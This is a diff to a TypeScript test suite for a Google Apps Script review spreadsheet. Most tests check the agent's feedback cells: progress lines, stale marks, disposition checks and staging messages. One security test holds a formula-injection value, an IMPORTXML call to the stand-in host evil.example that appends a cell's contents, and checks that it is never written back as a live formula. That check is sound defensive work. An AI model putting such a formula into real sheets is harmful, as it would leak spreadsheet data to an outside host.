@@ -145,6 +145,7 @@ function runtime(tabs: Record<string, { id: number; rows: string[][] }>) {
   return { g, written, props, sheet, toasts };
 }
 
+const T = (x: unknown) => (x && typeof x === "object" && "text" in (x as object) ? (x as { text: string }).text : x);
 function load(code: string, g: Record<string, unknown>) {
   const fn = new Function(...Object.keys(g), `${code}\nreturn { refreshAll, markDirty, refreshIfDirty };`);
   return fn(...Object.values(g)) as { refreshAll(): void; markDirty(e: unknown): void; refreshIfDirty(): void };
@@ -328,12 +329,13 @@ describe("review-sheet.gs, built and run against a fake sheet", () => {
     t["Agent - Change Sets"].rows[0].push("Feedback basis (change set)");
     t["Agent - Change Sets"].rows[1].push(basis);
     const run = () => { const b = runtime(t); load(code, b.g).refreshAll(); return b.written["Review Change Sets"] ?? {}; };
-    expect(run()["Committee Feedback (agent)"]).toBeUndefined();
+    // Only the progress line is added; the proposal is not flagged.
+    expect(T(run()["Committee Feedback (agent)"]?.[0]?.[0])).toBe("\u23f3 r#130 open; no preview yet.\nProposal");
     expect(run()["Ready for agent"]).toBeUndefined();
     // Control: a real change is still caught under the new name.
     row[3] = "do it differently";
     const w = run();
-    expect(String(w["Committee Feedback (agent)"][0][0])).toMatch(/^\u26a0 Stale: /);
+    expect(String(T(w["Committee Feedback (agent)"][0][0]))).toMatch(/^\u26a0 Stale: /);
     expect(w["Ready for agent"][0][0]).toBe("No");
   });
 
@@ -350,7 +352,28 @@ describe("review-sheet.gs, built and run against a fake sheet", () => {
     rt2.props.lastMs = "20000";
     load(code, rt2.g).markDirty({ range: { getSheet: () => rt2.sheet("Review Change Sets") } });
     expect(rt2.props.dirty).toBe("1");
-    expect(String(rt2.written["Review Change Sets"]["Change Set Feedback (agent)"][0][0])).toMatch(/^\u26a0 Stale: /);
+    expect(String(T(rt2.written["Review Change Sets"]["Change Set Feedback (agent)"][0][0]))).toMatch(/^\u26a0 Stale: /);
+  });
+
+  test("an Editor setting Ready for agent shows in the agent's feedback at once, even on a slow sheet (owner, 2026-10-31)", () => {
+    const hdr = ["Change-set", "Title", "TWG (CS)", "Committee Feedback (CL)", "Change Set Feedback (agent)", "Ready for agent"];
+    const row = ["CS-001", "Fix scope", "TWG 1", "do it", "Proposal", "Yes"];
+    const t = withConfig(tabs(), pcRows) as Record<string, { id: number; rows: string[][] }>;
+    t["Review Change Sets"].rows = [hdr, row];
+    t["Agent - Change Sets"].rows[0].push("Feedback basis (change set)");
+    t["Agent - Change Sets"].rows[1].push(feedbackBasis(hdr, row, ["Title", "TWG (CS)"], "Committee Feedback"));
+    const rt2 = runtime(t);
+    rt2.props.lastMs = "20000";
+    const sheet = rt2.sheet("Review Change Sets");
+    const edit = (c: number) => ({ range: { getSheet: () => sheet, getColumn: () => c, getNumColumns: () => 1, getRow: () => 2, getNumRows: () => 1 } });
+    load(code, rt2.g).markDirty(edit(6));
+    expect(rt2.props["ready:CS-001"]).toMatch(/^\d{4}-\d\d-\d\d \d\d:\d\dZ$/);
+    expect(String(T(rt2.written["Review Change Sets"]["Change Set Feedback (agent)"][0][0]))).toMatch(/^\u23f3 Ready for agent set .*: the agent will act on this and rewrite it\.\nProposal$/);
+    // An edit of another column records nothing.
+    const rt3 = runtime(t);
+    rt3.props.lastMs = "20000";
+    load(code, rt3.g).markDirty({ range: { ...edit(4).range, getSheet: () => rt3.sheet("Review Change Sets") } });
+    expect(rt3.props["ready:CS-001"]).toBeUndefined();
   });
 
   test("a sheet with both agent tables on one Agent tab, as before 2026-10-31, works the same", () => {
@@ -669,15 +692,15 @@ describe("review-sheet.gs in drafting mode", () => {
     const rt2 = runtime(t);
     const s = load(code, rt2.g);
     s.refreshAll();
-    expect(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"]).toBeUndefined();
+    expect(T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0])).toBe("\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\nDefine it in 1.1");
     f[1][1] = "Define registry and register";
     s.refreshAll();
-    const stale = rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0] as string;
-    expect(stale).toMatch(/^\u26a0 Stale: .*\nDefine it in 1\.1$/);
+    const stale = T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0]) as string;
+    expect(stale).toMatch(/^\u26a0 Stale: .*\n\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current\.\nDefine it in 1\.1$/);
     f[1][1] = "Define registry";
     f[1][9] = stale;
     s.refreshAll();
-    expect(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0]).toBe("Define it in 1.1");
+    expect(T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0])).toBe("\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\nDefine it in 1.1");
   });
 
   test("the agent column under its new name, Feedback (agent), is read the same, and never counts as a person's feedback", () => {
@@ -691,10 +714,10 @@ describe("review-sheet.gs in drafting mode", () => {
     const rt2 = runtime(t);
     const s = load(code, rt2.g);
     s.refreshAll();
-    expect(rt2.written["Contributor Feedback"]["Feedback (agent)"]).toBeUndefined();
+    expect(String(T(rt2.written["Contributor Feedback"]["Feedback (agent)"][0][0]))).not.toMatch(/Stale/);
     f[1][1] = "A new title";
     s.refreshAll();
-    expect(String(rt2.written["Contributor Feedback"]["Feedback (agent)"][0][0])).toMatch(/^\u26a0 Stale: .*\nQuestion for the editor/);
+    expect(String(T(rt2.written["Contributor Feedback"]["Feedback (agent)"][0][0]))).toMatch(/^\u26a0 Stale: .*\n\u23f3 .*\nQuestion for the editor/);
   });
 
   test("a new empty feedback column marks nothing stale, and a basis written the older way still matches", () => {
@@ -713,13 +736,13 @@ describe("review-sheet.gs in drafting mode", () => {
     const rt2 = runtime(t);
     const s = load(code, rt2.g);
     s.refreshAll();
-    expect(rt2.written["Contributor Feedback"]?.["Contributor Feedback (agent)"]).toBeUndefined();
+    expect(String(T(rt2.written["Contributor Feedback"]?.["Contributor Feedback (agent)"]?.[0]?.[0]) ?? "")).not.toMatch(/Stale/);
     // The agent writes the new basis; then a new reviewer's empty column appears.
     t.Agent.rows[1][t.Agent.rows[0].indexOf("Feedback basis (change set)")] = feedbackBasis(f[0], f[1]);
     f[0].splice(ag, 0, "Contributor Feedback (XY)");
     f.slice(1).forEach((x) => x.splice(ag, 0, ""));
     s.refreshAll();
-    expect(rt2.written["Contributor Feedback"]?.["Contributor Feedback (agent)"]).toBeUndefined();
+    expect(String(T(rt2.written["Contributor Feedback"]?.["Contributor Feedback (agent)"]?.[0]?.[0]) ?? "")).not.toMatch(/Stale/);
   });
 
   test("a proposal turning stale sets Ready for agent back to No, once, so an Editor's new Yes stays", () => {
@@ -740,7 +763,7 @@ describe("review-sheet.gs in drafting mode", () => {
     s.refreshAll();
     expect(rt2.written["Contributor Feedback"]["Ready for agent"][0][0]).toBe("No");
     // Still stale, and an Editor sets Yes again: it stays.
-    f[1][ag] = rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0] as string;
+    f[1][ag] = T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0]) as string;
     f[1][rd] = "Yes";
     delete rt2.written["Contributor Feedback"]["Ready for agent"];
     s.refreshAll();
@@ -780,7 +803,18 @@ describe("review-sheet.gs in drafting mode", () => {
     t.Agent.rows[1][at("Staging built from (change set)")] = "1234567";
     t.Agent.rows[1][at("Staging deploy (change set)")] = "pending";
     s.refreshAll();
-    expect(text()).toBe("review \u26a0 deploy in progress");
+    expect(text()).toBe("review \u26a0 restaging: Pages is deploying it");
+    t.Agent.rows[1][at("Staging deploy (change set)")] = "deploying, expected 2026-10-31 15:20Z";
+    s.refreshAll();
+    expect(text()).toBe("review \u26a0 restaging: Pages is deploying it, expected live 2026-10-31 15:20Z");
+    t.Agent.rows[1][at("Staging deploy (change set)")] = "pushed";
+    s.refreshAll();
+    expect(text()).toBe("review \u26a0 restaging: on gh-pages, waiting for Pages to deploy");
+    t.Agent.rows[1][at("Staging built from (change set)")] = "abcdef1";
+    t.Agent.rows[1][at("Staging deploy (change set)")] = "building";
+    s.refreshAll();
+    expect(text()).toBe("review \u26a0 stale: built from abcdef1, PR now at 1234567; restaging: building the preview");
+    t.Agent.rows[1][at("Staging built from (change set)")] = "1234567";
     t.Agent.rows[1][at("Staging deploy (change set)")] = "failed";
     s.refreshAll();
     expect(text()).toBe("review \u26a0 deploy failed");
@@ -805,6 +839,31 @@ describe("review-sheet.gs in drafting mode", () => {
     expect(rt3.written["Review Change Sets"]).toBeDefined();
   });
 
+  test("the change set's Dispositions blurb is shown from the Agent tab (owner, 2026-10-31)", () => {
+    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
+    const f = t["Contributor Feedback"].rows;
+    f[0].push("Disposition (agent)");
+    f.forEach((x, i) => i && x.push(""));
+    t.Agent.rows[0].push("Disposition (change set)");
+    t.Agent.rows[1].push("Accepted: define registry in 1.1. Noted: style of 1.2.");
+    t.Agent.rows.slice(2).forEach((x) => x.push(""));
+    const rt2 = runtime(t);
+    load(code, rt2.g).refreshAll();
+    expect(T(rt2.written["Contributor Feedback"]["Disposition (agent)"][0][0])).toBe("Accepted: define registry in 1.1. Noted: style of 1.2.");
+  });
+
+  test("each comment of the change set needs one disposition; an overall statement is allowed (owner, 2026-10-31)", () => {
+    const fns = new Function("SpreadsheetApp", `${code}\nreturn { dispositionProblems };`)({}) as { dispositionProblems: (t: string, n: string[], h?: Record<string, string>) => string };
+    const ok = "Decided (Q1, 2026-10-31): A, by the Editor; gloss it.\nOverall: partly accepted as editorial.\nNo. 136: Accepted. Defined at first use.\nNos. 127 to 129 and 131: Not accepted. Already addressed.\nNo. 130: Noted.";
+    expect(fns.dispositionProblems(ok, ["127", "128", "129", "130", "131", "136"])).toBe("");
+    expect(fns.dispositionProblems(ok, ["127", "128", "129", "130", "131", "136", "140", "141"])).toBe("\u26a0 No disposition yet for No. 140, 141");
+    expect(fns.dispositionProblems("No. 136: Fixed it.", ["136"])).toMatch(/^\u26a0 No. 136: start with one of Accepted/);
+    expect(fns.dispositionProblems("No. 9: Noted.\nNo. 136: Accepted.\nNo. 136: Noted.", ["136"])).toBe("\u26a0 No. 9 is not in this change set\n\u26a0 No. 136 has two dispositions");
+    // Drawn from the people's Blue Disposition: a different word is flagged, Pending is not.
+    expect(fns.dispositionProblems("No. 136: Accepted.\nNo. 137: Noted.", ["136", "137"], { "136": "Noted", "137": "Pending" }))
+      .toBe("\u26a0 No. 136: Accepted here, Noted in the people's Disposition");
+  });
+
   test("security: text a person or the agent typed is never written back as a formula", () => {
     const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
     const f = t["Contributor Feedback"].rows;
@@ -818,7 +877,8 @@ describe("review-sheet.gs in drafting mode", () => {
     const rt2 = runtime(t);
     load(code, rt2.g).refreshAll();
     const w = rt2.written["Contributor Feedback"];
-    expect(w["Contributor Feedback (agent)"][0][0]).toBe("'" + '=IMPORTXML("https://evil.example/?"&A1,"//a")');
+    // The progress line now leads, so the cell cannot start as a formula.
+    expect(T(w["Contributor Feedback (agent)"][0][0])).toBe('\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\n=IMPORTXML("https://evil.example/?"&A1,"//a")');
     expect(String(w["Selected Sections"][1][0]).startsWith("'=")).toBe(true);
   });
 
@@ -971,6 +1031,12 @@ describe("the Config tab's colours", () => {
 });
 
 describe("running the script from the editor", () => {
+  test("Install never waits on a dialog, which hangs a run started from the editor (owner, 2026-10-31)", () => {
+    const fns = [...code.matchAll(/^function (\w+)\([^)]*\) \{[\s\S]*?^\}/gm)];
+    const withAlert = fns.filter((m) => /\.alert\(/.test(m[0])).map((m) => m[1]);
+    expect(withAlert).toEqual(["showVersion"]);
+  });
+
   test("installTriggers is the first function, so the editor's Run button picks it", () => {
     expect(code.match(/^function (\w+)/m)?.[1]).toBe("installTriggers");
   });
@@ -1008,7 +1074,9 @@ describe("Ready for agent after the preview was built (owner, 2026-10-31)", () =
     },
     newTextStyle: () => ({ setBold: () => ({ build: () => ({}) }) }),
   };
-  const fns = new Function("SpreadsheetApp", `${code}\nreturn { stagingWarning, agenticCell };`)(sheets) as {
+  const fns = new Function("SpreadsheetApp", `${code}\nreturn { stagingWarning, agenticCell, progressLine, withProgress };`)(sheets) as {
+    progressLine: (o: object) => string;
+    withProgress: (t: string, l: string) => string;
     stagingWarning: (u: string, b: object, p: object[], r?: string) => string;
     agenticCell: (s: string, p: object[], o?: object) => { text: string; links: [number, number, string][] };
   };
@@ -1019,6 +1087,27 @@ describe("Ready for agent after the preview was built (owner, 2026-10-31)", () =
     expect(fns.stagingWarning("u", built, [pr])).toBe("");
     expect(fns.stagingWarning("u", built, [pr], "2026-10-31 11:30Z")).toBe("\u26a0 missing feedback from 2026-10-31 11:30Z");
     expect(fns.stagingWarning("u", built, [pr], "2026-10-31 08:00Z")).toBe("");
+  });
+
+  test("the agent's feedback says where the PR and preview are (owner, 2026-10-31)", () => {
+    const o = { prs: [pr], staging: "u", built, status: "Done" };
+    expect(fns.progressLine(o)).toBe("\u23f3 dth-hrh#7 open, updated 2026-10-31 08:10Z; preview current (built 2026-10-31 08:15Z).");
+    expect(fns.progressLine({ ...o, staging: "" })).toBe("\u23f3 dth-hrh#7 open, updated 2026-10-31 08:10Z; no preview yet.");
+    // An Editor's Orange change is noted, not marked stale.
+    expect(fns.progressLine({ ...o, readyAt: "2026-10-31 11:30Z" })).toBe("\u23f3 Ready for agent set 2026-10-31 11:30Z: the agent will act on this and rewrite it.");
+    expect(fns.progressLine({ ...o, merge: true })).toBe("\u23f3 Ready for merge set: the agent will merge dth-hrh#7.");
+    expect(fns.progressLine({ ...o, status: "Working" })).toBe("\u23f3 The agent is working on dth-hrh#7.");
+    expect(fns.progressLine({ ...o, status: "Merged" })).toBe("");
+    expect(fns.progressLine({ prs: [] })).toBe("");
+  });
+
+  test("the progress line is replaced in place, below a stale mark, and never added to an empty cell", () => {
+    const stale = "\u26a0 Stale: the row changed since this proposal; the agent will propose again.";
+    expect(fns.withProgress("Proposal", "\u23f3 a")).toBe("\u23f3 a\nProposal");
+    expect(fns.withProgress("\u23f3 old\nProposal", "\u23f3 new")).toBe("\u23f3 new\nProposal");
+    expect(fns.withProgress(stale + "\n\u23f3 old\nProposal", "\u23f3 new")).toBe(stale + "\n\u23f3 new\nProposal");
+    expect(fns.withProgress("\u23f3 old\nProposal", "")).toBe("Proposal");
+    expect(fns.withProgress("", "\u23f3 a")).toBe("");
   });
 
   test("Agentic status says the row is queued, then who has it", () => {
@@ -1073,6 +1162,9 @@ describe("Decision needed stands out in the agent's feedback (owner, 2026-10-31)
   });
   test("no block, no spans", () => {
     expect(fns.decisionSpans("Decided (Q1): A.")).toEqual([]);
+    // The script's status line is bold as well, below a stale mark.
+    const st = "\u26a0 Stale: x\n\u23f3 r#1 open.\nProposal";
+    expect(fns.decisionSpans(st)).toEqual([[st.indexOf("\u23f3"), st.indexOf("\nProposal")]]);
   });
 });
 
